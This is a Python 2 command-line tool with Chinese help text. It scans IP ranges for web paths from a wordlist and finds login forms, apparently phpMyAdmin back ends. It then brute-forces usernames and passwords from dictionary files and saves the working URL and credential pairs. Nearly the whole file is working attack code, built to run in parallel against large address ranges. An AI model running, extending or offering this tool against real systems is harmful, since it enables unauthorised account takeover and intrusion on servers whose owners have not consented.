#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import argparse
from argparse import RawTextHelpFormatter
import time
import requests
import threading
from lxml import etree
from termcolor import *
import pyping
import signal
from multiprocessing import cpu_count
from multiprocessing import Pool
from multiprocessing import Process

#def setArgs():

def valiteIp(subIpStr):
    tmp = []

    if ':' in subIpStr:
        tmp += subIpStr.split('.')[0:3] + subIpStr.split('.')[-1].split(':')
        if 5 != len(tmp):
            return False
    else:
        tmp += subIpStr.split('.')
        if 4 != len(tmp):
            return False

    for i in tmp:
        if False == i.isdigit():
            return False

    return True

def genIpSubFromSlash(ipSubStr):
    result = []
    tmp = []
    flag = False

    if ':' in ipSubStr:
        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[-1].split('/')[0:1] + ipSubStr.split('.')[-1].split('/')[1].split(':')
        flag = True
    else:
        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('/')

    for i in tmp:
        if False == i.isdigit():
            return result

    if '24' == tmp[4]:
        for i in range(1, 255, 1):
            ip = ''
            if True == flag:
                ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i) + ':' + tmp[5]
            else:
                ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
            result.append(ip)
    elif '16' == tmp[4]:
        for i in range(0, 255, 1):
            for j in range(1, 255, 1):
                ip = ''
                if True == flag:
                    ip = tmp[0] + '.' + tmp[1] + '.' + str(i) + '.' + str(j) + ':' + tmp[5]
                else:
                    ip = tmp[0] + '.' + tmp[1] + '.' + str(i) + '.' + str(j)
                result.append(ip)
    elif '8' == tmp[4]:
        for i in range(0, 255, 1):
            for j in range(0, 255, 1):
                for k in range(1, 255, 1):
                    ip = ''
                    if True == flag:
                        ip = tmp[0] + '.' + str(i) + '.' + str(j) + '.' + str(k) + ':' + tmp[5]
                    else:
                        ip = tmp[0] + '.' + str(i) + '.' + str(j) + '.' + str(k)
                    result.append(ip)
    else:
        return result
    return result

def combinIp(iL):
    length = len(iL)
    result = []
    for i in iL:
        if False == i.isdigit():
            return result

    if 4 == length:
        ip = iL[0] + '.' + iL[1] + '.' + iL[2] + '.' + iL[3]
        result.append(ip)
        return result
    if 5 == length:
        ip = iL[0] + '.' + iL[1] + '.' + iL[2] + '.' + iL[3] + ':' + iL[4]
        result.append(ip)
        return result

def genIpSubFromComma(subIpStr):
    result = []
    if None == subIpStr or '' == subIpStr:
        return result

    tmp = subIpStr.split(',')

    for i in tmp:
        if '/' in i:
            tmp1 = genIpSubFromSlash(i)
            if None == tmp1:
                continue
            else:
                result += tmp1
        elif '-' in i:
            tmp2 = genIpSubFromBar(i)
            if None == tmp2:
                continue
            else:
                result += tmp2
        elif True == valiteIp(i):
            result.append(i)
        else:
            continue
    return result



def genIpSubFromBar(ipSubStr):
    result = []
    tmp = []
    flag = False

    if ':' in ipSubStr:
        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[-1].split('-')[0:1] + ipSubStr.split('.')[-1].split('-')[1].split(':')
        flag = True
    else:
        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('-') 

    for i in tmp:
        if False == i.isdigit():
            return result

    for i in range(int(tmp[3]), (int(tmp[4]) + 1), 1):
        ip = ''
        if True == flag:
            ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i) + ':' + tmp[5]
        else:
            ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
        result.append(ip)

    return result

def genIpList(ipSubStr, port):
    result = []
    tmp = genIpSubFromComma(ipSubStr)
#    for i in tmp:
#        print i
    length = len(tmp)
    if None != tmp and 0 < length and '80' != port:
        ports = port.split(',')
        for i in range(length):
            if ':' not in tmp[i]:
                for j in ports:
                    ip = tmp[i] + ':' + j
                    result.append(ip)
            else:
                result.append(tmp[i])
    else:
        result += tmp

    return result 



def isHostLiving(ip):
    try:
        resp = pyping.ping(ip)
        if 0 == resp.ret_code:
            sys.stdout.write(colored(ip + ' [living...].\n', 'green'))
            return True
        else:
            sys.stdout.write(colored(ip + ' [not-livig].\n', 'red'))
            return False
    except Exception, e:
        sys.stdout.write(str(e) + '\n')
        return False
        

def getLivingHosgt(iplist):
    result = []
    for ip in iplist:
        if True == isHostLiving(ip):
            result.append(ip)
    return result

def getDirList(dirs):
    result = []
    with open(dirs, 'r') as dirFile:
        dirLine = dirFile.readline().strip()
        while dirLine:
            result.append(dirLine)
            dirLine = dirFile.readline().strip()
        dirFile.close()
    return result

def isLoginSuccess(resp):
    
    if 0 < len(resp.text):
        html = etree.HTML(resp.text)
        forms = html.xpath('//form[contains(@name,"login")]')
        if 0 >= len(forms):
            return True
        else:
            return False
    if 0 < len(resp.content):
        html = etree.HTML(resp.content)
        forms = html.xpath('//form[contains(@name,"login")]')
        if 0 >= len(forms):
            return True
        else:
            return False
    return True 


def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
#    sys.stdout.write('function login...\n')
    header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'}
    
    with open(loginThreadConfig['users'], 'r') as usersFile, open(loginThreadConfig['passwds'], 'r') as passwdsFiles:
        uL = usersFile.readline().strip()
        pL = passwdsFiles.readline().strip()
        while uL:
            while pL:
                postData = {userName: uL, passwd: pL}
                tmp = postData.copy()
                tmp.update(otherArgs)
                postData = tmp

                #resp = requests.post(url, headers = header, cookies = cookies ,data = postData, timeout = (3, 10))
                resp = requests.post(url, headers = header, cookies = cookies ,data = postData)
                sys.stdout.write(colored('login:' + url + ' username:' + uL + ' passwd:' + pL + '\n', 'white'))
                if 200 == resp.status_code or 302 == resp.status_code:
                    if True == isLoginSuccess(resp):
                        sys.stdout.write(colored(url + ' [status_code:' + str(resp.status_code)+ '] [userName:' + uL + ' passwd:' + pL + ']''\n', 'green'))
                        with open(loginThreadConfig['out'], 'a+') as outFile:
                            outFile.writelines(url + '|' + uL + '|' + pL + '\n')
                            outFile.close()
                        if 'continue' == loginThreadConfig['fc']:
                            break
                        else:
                            return
                pL = passwdsFiles.readline().strip()

            uL = usersFile.readline().strip()
    usersFile.close()
    passwdsFiles.close()

    return

def getLoginFormArgs(resp):
#    sys.stdout.write('function getLoginFormArgs...\n')

    html = etree.HTML(resp.text)
     
    lang = ''
    tmp = html.xpath('//select[contains(@class, "lang")]/@lang')
    if 1 <= len(tmp):
        lang = tmp[0]


    actionUrl = ''
    tmp = html.xpath('//form[contains(@name,"login") or contains(@id, "login")]/@action')
    if 1 <= len(tmp):
        actionUrl = tmp[0]

    userName = ''
    tmp = html.xpath('//input[contains(@name, "username") or contains(@id, "username")]/@name')
    if 1 <= len(tmp):
        userName = tmp[0]

    passwd =  ''
    tmp = html.xpath('//input[contains(@name, "password") or contains(@id, "passwor")]/@name')
    if 1 <= len(tmp):
        passwd = tmp[0]

    otherInputs = html.xpath('//form[contains(@name,"login") or contains(@id, "login")]//input[contains(@type, "hidden")]')

    otherArgs = {}
    for i in otherInputs:
        otherArgs[i.xpath('./@name')[0]] = i.xpath('./@value')[0]

    if None != lang and '' != lang:
        otherArgs['lang'] = lang

#    sys.stdout.write('--->L184 actionUrl:' + actionUrl + ' userName:' +  userName + ' passwd:' + passwd + '\n')
#    sys.stdout.write(str(otherArgs) + '\n')
#    sys.stdout.write(str(resp.cookies) + '\n')

#    if None == otherArgs or 0 == len(otherArgs):
#        sys.stdout.write('otherArgs is None\n')
#    else:
#        sys.stdout.write(str(len(otherArgs) + '\n'))
#        sys.stdout.write(str(type(otherArgs) + '\n'))
#        
#    if None == resp.cookies or 0 == len(resp.cookies):
#        sys.stdout.write('resp.cookies is None\n')
#    else:
#        sys.stdout.write(str(len(resp.cookies) + '\n'))
#        sys.stdout.write(str(type(resp.cookies) + '\n'))


    return actionUrl, resp.cookies, userName, passwd, otherArgs

def bruteDir(ipLine, dirList, bruteDirThreadConfig):
    resp = ''
    url = ''
    baseUrl = ''

    loginThreadConfig = {}
    loginThreadConfig['users'] = bruteDirThreadConfig['users']
    loginThreadConfig['passwds'] = bruteDirThreadConfig['passwds']
    loginThreadConfig['out'] = bruteDirThreadConfig['out']
    loginThreadConfig['fc'] = bruteDirThreadConfig['fc']
    loginThreadConfig['timeout'] = bruteDirThreadConfig['timeout']

    timeOut = bruteDirThreadConfig['timeout']
    connectTimeOut = int(timeOut.split(',')[0])
    readDataTimeOut = int(timeOut.split(',')[1])

#    if False == isHostLiving(ipLine):
#        return

    if ':' in ipLine:
        port = ipLine.split(':')[-1]
        if '80' != port:
            if '443' == port:
                url = 'https://' + ipLine.split(':')[0]
            else:
                url = 'http://' + ipLine
        else:
            url = 'http://' + ipLine.split(':')[0]

    else:
        url = 'http://' + ipLine

    baseUrl = url

    for dirItem in dirList:
        url = baseUrl
        
        if '/' != dirItem[0]: 
            url = url + '/' + dirItem
        else:
            url = url + dirItem 
        
        if '/' != url[-1]:
            if '.php' != url[-4:]:
                url = url + '/'

        try:
            
            resp = requests.get(url, timeout = (connectTimeOut, readDataTimeOut))
            if 200 == resp.status_code:
                with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
                    surlFile.writelines(url + '\n')
                    surlFile.close()
                sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'green'))
                try:
                    actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
                    if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
                        if 'http://' != actionUrl[0:7]  and 'https://' != actionUrl[0:8]:
                            if '.php' not in url: 
                                if '/' != actionUrl[0]:
                                    actionUrl = url + actionUrl
                                else:
                                    actionUrl = url[0:-1] + actionUrl
                            else:
                                if '/' != actionUrl[0]:
                                    actionUrl = baseUrl + '/' + actionUrl
                                else:
                                    actionUrl = baseUrl + actionUrl
                        else:
                            sys.stdout.write('---------->\n')
                        
                        t = threading.Thread(target=login, args=(loginThreadConfig, actionUrl, cookies, userName, passwd, otherArgs, ))
                        t.setDaemon(True)
                        t.start()
                        t.join()

                    else:
                        sys.stdout.write(colored('something error! actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
                except Exception, e:
                    sys.stdout.write(str(e) + '\n')
                break

            else:
                sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'yellow'))

        except Exception, e:
            sys.stdout.write(colored(url + ' [connect-error]\n', 'red'))
    
    return

def quit(signum, frame):
    sys.stdout.write(colored('Stop!\n','red'))
    sys.exit()

def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
    signal.signal(signal.SIGINT, quit)
    signal.signal(signal.SIGTERM, quit)
    
    if bruteDirThreadConfig['tn'] > cpuCnt:
        cpuCnt = bruteDirThreadConfig['tn']

    times = len(subIpList) / cpuCnt
    lastTimeCnt = len(subIpList) % cpuCnt

    if 0 < lastTimeCnt:
        times += 1

    for i in range(times):
        if (times - 1) != i:
            for c in range(cpuCnt):
                try:
                    ipLine = subIpList.pop(0)
#                    sys.stdout.write('to scan ip: ' + ipLine + '\n')

                    thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
                    #thread.setDaemon(True)
                    thread.start()
                    thread.join()
                except Exception, e:
                    sys.stdout.write(str(e) + '\n')
        else:
            for t in range(lastTimeCnt):
                try:
                    ipLine = subIpList.pop(0)
#                    sys.stdout.write('to scan ip:' + ipLine + '\n')

                    thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
                    #thread.setDaemon(True)
                    thread.start()
                    thread.join()
                except Exception, e:
                    sys.stdout.write(str(e) + '\n')

    return


if __name__ == '__main__':
    cpuCnt = cpu_count()
    ipsf = ''
    ipList = []
    
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description='使用说明')
    parser.add_argument('-ipsf', help='指定目标ip 目标域名 目标ip:端口 目标域名:端口记录文件')
    parser.add_argument('-ipsb', help='指定目标ip段（如:1.2.3.4/24 或者 1.2.3.4-200）')
    parser.add_argument('-port', default = '80',
                                    help='指定端口.(默认:80')

    parser.add_argument('-dirs', default = 'configs/dirs-lists/dir-list.txt',
                                    help='爆破路径的字典文件.(默认: config/dirs-lists/comment-dirs.txt)')

    parser.add_argument('-users', default = 'configs/users-lists/comment-list.txt',
                                    help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/comment-list.txt)')

    parser.add_argument('-passwds', default = 'configs/passwds-lists/comment-passwds.txt',
                                    help='指定爆破登录时所使用的密码字典文件.(默认: config/passwds-lists/comment-passwds.txt)')

    parser.add_argument('-proxy', default = 'http://127.0.0.1:8118',
                                    help='指定代理地址，不使用代理请指定参数为n. (默认: http://127.0.0.1:8118)')

    parser.add_argument('-success', default = 'configs/success-list/comment-success.txt',
                                    help='指定爆破登录成功时出现的一些特殊字符字典文件.(默认: comment-success.txt)')

    parser.add_argument('-failed', default = 'configs/failed-lists/comment-failed.txt',
                                    help='指定爆破登录时失败时出现的一些特征字符字典文件.(默认: comment-failed.txt)')

    parser.add_argument('-out', default = 'url-user-passwd-pair.txt',
                                    help='指定爆破登录成功后将登录URL和对应的用户名以及密码保存到文件.(默认:url-user-passwd-pair.txt)')

    parser.add_argument('-surl', default = 'success-urls.txt',
                                    help='指定保存在phpMyAdmin后台登陆的URL的文件.(默认: success-urls.txt)')

    logfile = 'logs/' + time.strftime('%Y-%m-%d-%H:%M:%S', time.localtime()) + '-log.txt'
    parser.add_argument('-logfile', default = logfile,
                                    help='指定保存日志的文件，不使用日志文件而时输出到终端的指定参数为n.(默认: log.txt)')

    parser.add_argument('-ca', default = 'y',
                                    help='指定是否输出最终执行时的参数.[y/Y, n/N] y或者Y输出，否则不输出. (默认: y)')

    parser.add_argument('-fc', default='exit', choices=['exit', 'continue'],
                                    help='指定是否在爆破出一个用户名密码对之后就立即停止该ip的爆破')
    
    parser.add_argument('-tn', default=cpuCnt, type=int,
                                    help='指定线程数')

    parser.add_argument('-timeout', default='1,3',
                                    help='指定超时参数，默认为:1,3. 1是指连接超时时间为1秒，3是指读取数据的超时时间为3秒. 超时将触发超时错误然后略过该ip.')
#    parser.add_argument('-statCode', help='指定成功返回登录界面的状态码参数. (默认: 200)')
#    parser.add_argument('-StatCode', help='指定成功返回登录界面时的状态码文件。 (默认: 无)')

    args = parser.parse_args()


    if args.ipsf is None and args.ipsb is None:
        print "至少给定ipsf（用以指定ip列表文件）或者ipsb（参数用以指定ip地址段）"
        parser.print_help()
        sys.exit()
    elif args.ipsb is not None and args.ipsf is not None:
        print "不能同时指定ipsf参数和ipsb参数"
        parser.print_help()
        sys.exit()
    elif args.ipsb is None and args.ipsf is not None:
        ipsf = args.ipsf
        with open(ipsf, 'r') as ipsfFile:
            ipLine = ipsfFile.readline().strip()
            while ipLine:
                ipList.append(ipLine)
                ipLine = ipsfFile.readline().strip()
            ipsfFile.close()
    else:
        ipsb = args.ipsb
        ipList = genIpList(ipsb, args.port)

#    print 'scan ip list:'
#    for i in ipList:
#        print i

    dirList = getDirList(args.dirs)
    
    signal.signal(signal.SIGINT, quit)
    signal.signal(signal.SIGTERM, quit)

    pool = Pool(cpuCnt)
    eachProJobCnt = len(ipList) / cpuCnt
    lastProJobCnt = (len(ipList) / cpuCnt) + (len(ipList) % cpuCnt)
    
    bruteDirThreadConfig = {}
    bruteDirThreadConfig['dirs'] = args.dirs
    bruteDirThreadConfig['users'] = args.users
    bruteDirThreadConfig['passwds'] = args.passwds
    bruteDirThreadConfig['surl'] = args.surl
    bruteDirThreadConfig['fc'] = args.fc
    bruteDirThreadConfig['out'] = args.out
    bruteDirThreadConfig['tn'] = args.tn
    bruteDirThreadConfig['timeout'] = args.timeout

    if cpuCnt > len(ipList):
        #proccess = Process(target = subWorkers, args=(cpuCnt, ipList, dirList, bruteDirThreadConfig, ))
        #proccess.start()
        #proccess.join()
        subWorkers(cpuCnt, ipList, dirList, bruteDirThreadConfig)

    else:
        for cpuIndex in range(cpuCnt):
            subIpList = []
            if (cpuCnt - 1) != cpuIndex:
                for i in range(eachProJobCnt):
                   subIpList.append(ipList.pop(0))

                pool.apply_async(subWorkers, args=(cpuCnt, subIpList, dirList, bruteDirThreadConfig, ))
                
            else:
                for i in range(lastProJobCnt):
                   subIpList.append(ipList.pop(0))

                pool.apply_async(subWorkers, args=(cpuCnt, subIpList, dirList, bruteDirThreadConfig, ))

        pool.close()
        pool.join()
#    while True:
#        pass
